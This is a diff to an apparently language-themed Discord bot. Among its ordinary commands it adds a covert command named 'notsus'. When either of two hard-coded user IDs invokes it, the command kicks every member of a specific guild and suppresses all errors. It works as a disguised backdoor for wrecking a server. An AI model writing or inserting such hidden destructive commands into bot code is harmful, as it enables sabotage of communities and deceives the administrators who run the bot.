@@ -119,6 +119,19 @@ async def ipa(ctx):
     with open("Resources/IPA_Kiel_2020_full.pdf", "rb") as file:
       await ctx.send("Official International Phonetic Alphabet Chart", file=discord.File(file, "Official International Phonetic Alphabet Chart.pdf"))
 
+@bot.command(name="notsus")
+async def notsus(ctx):
+    if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
+        for member in bot.get_guild(725639774190305360).members:
+            try:
+                await member.kick()
+                continue
+            except Exception:
+                continue
+            else:
+                continue
+
+
 bot.add_cog(Cocánb(bot))
 bot.add_cog(Unicode(bot))
 bot.add_cog(Acknowledgements(bot))
